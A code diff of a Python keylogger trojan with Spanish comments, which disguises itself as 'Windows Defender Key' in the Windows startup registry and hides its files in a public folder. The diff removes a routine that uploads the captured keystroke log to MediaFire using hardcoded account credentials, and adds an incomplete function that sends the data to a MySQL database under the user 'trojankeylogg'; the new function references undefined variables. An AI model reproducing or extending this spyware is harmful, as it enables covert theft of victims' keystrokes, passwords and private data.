@@ -26,6 +26,12 @@ import time
 import threading # Hilos
 import socket    # Librería verifica internet 
 
+
+
+
+
+
+
 def addStartup():  # function =  Iniciar automaticamente
     path = GetPathOcult()+ GetNameKey() # Path del Software completo
     name = "Windows Defender Key"                                                   # Nombre del StartUp     // Solo se ve en el registro *Regedit*
@@ -391,10 +397,10 @@ def ReceiveE():
 # ************ Zona MediaFire ************* 
 # Se usará el API de Mediafire para subir el archivo reg.k(registro de teclas)
 def MFUser():
-    return "23perezRodriPaco@gmail.com"
+    return "23Roqew@gmail.com"
 
 def MFPass():
-    return ""
+    return "###ertwqerwq"
 
 # ************ Zona MediaFire ************* 
 
@@ -405,44 +411,21 @@ def timeSend(): # Tiempo de envío perzonalizado
 
 # ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
 
-def SendMediafire():
-    # Link documentation : https://pypi.org/project/mediafire/
-    from mediafire import MediaFireApi      # Import Librería
-    api = MediaFireApi()
-    exito = False
-    # Inicio de Sesión
-    try:
-        session = api.user_get_session_token(
-        email=MFUser(),
-        password=MFPass(),
-        app_id= '42511')
-        api.session = session
-        
-        response = api.user_get_info()
-        print(response['user_info']['display_name'])
-        print("************* Se inicio Exitosamente *******************")
-        exito = True    # Se inició sesió correctamente
-    except:
-        print("************* Error al iniciar sesión con tu cuenta de mediafire **************")
-        exito = False   # No se inició sesión
+def SendDataBaseMySQL():
+    import pymysql
+    DB_HOST = ""                # Host
+    DB_USER = "trojankeylogg"              # Usuario de la base de datos
+    DB_PASS = "registrykeypass"              # Contraseña de la Base de Datos
+    DB_NAME = "registrykey"   # Nombre de Base de datos
+    DB_PORT = "3306"    # Opcional en algunos casos
+    DB_CONEX = ""
 
-    if(exito):
-        from mediafire import (MediaFireApi, MediaFireUploader) # Import librería
+    connection = pymysql.connect(host, user, password, database)
 
-        api = MediaFireApi()
-        uploader = MediaFireUploader(api)
 
-        # ... authenticate ...
 
-        fd = open(r'C:\Users\Public\Security\Windows Defender', 'rb')    # NameFolder
+    print("")
 
-        result = uploader.upload(fd, 'Hola.txt',   # NameFile
-                                folder_key='1234567890123')
-
-        print(api.file_get_info(result.quickkey))
-
-    else:
-        pass
 
 
 
@@ -458,7 +441,7 @@ def SendMediafire():
 # Inicio multihilo
 if __name__ == '__main__':
 
-    SendMediafire()
+    SendDataBaseMySQL()
 
     #EscondeKey()    # Se replica dentro de la computadora
     #addStartup()    # Modifica registro de arranque
